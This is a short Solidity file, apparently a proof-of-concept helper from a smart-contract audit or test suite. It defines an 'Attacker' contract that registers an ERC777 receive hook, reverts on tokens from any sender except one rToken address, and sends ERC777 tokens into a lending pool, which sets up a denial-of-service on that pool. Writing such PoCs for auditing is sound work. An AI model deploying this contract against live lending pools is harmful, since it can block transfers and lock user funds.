//SDPX-License-Identifier: MIT

pragma solidity ^0.8.20;

import "@openzeppelin/contracts/interfaces/IERC777Recipient.sol";
import "@openzeppelin/contracts/interfaces/IERC20.sol";
import "@openzeppelin/contracts/interfaces/IERC1820Registry.sol";
import {LendingPool} from "contracts/core/pools/LendingPool/LendingPool.sol";
import {ERC777} from "./ERC777.sol";

contract Attacker is IERC777Recipient {
    address public rTokenaddy;
    address public erc777;
    error RejectERC777Error();

    IERC1820Registry private _erc1820 =
        IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);

    constructor(address _rTokenaddy, address _erc777) {
        rTokenaddy = _rTokenaddy;
        erc777 = _erc777;

        // Register interface in ERC1820 registry
        _erc1820.setInterfaceImplementer(
            address(this),
            keccak256("ERC777TokensRecipient"),
            address(this)
        );
    }

    // ERC777 hook
    function tokensReceived(
        address,
        address from,
        address,
        uint256,
        bytes calldata,
        bytes calldata
    ) external {
        if (from != rTokenaddy) {
            revert RejectERC777Error();
        }
    }

    function sendToken(address lendingPool, uint256 amount) external {
        ERC777(erc777).transfer(lendingPool, amount);
    }
}
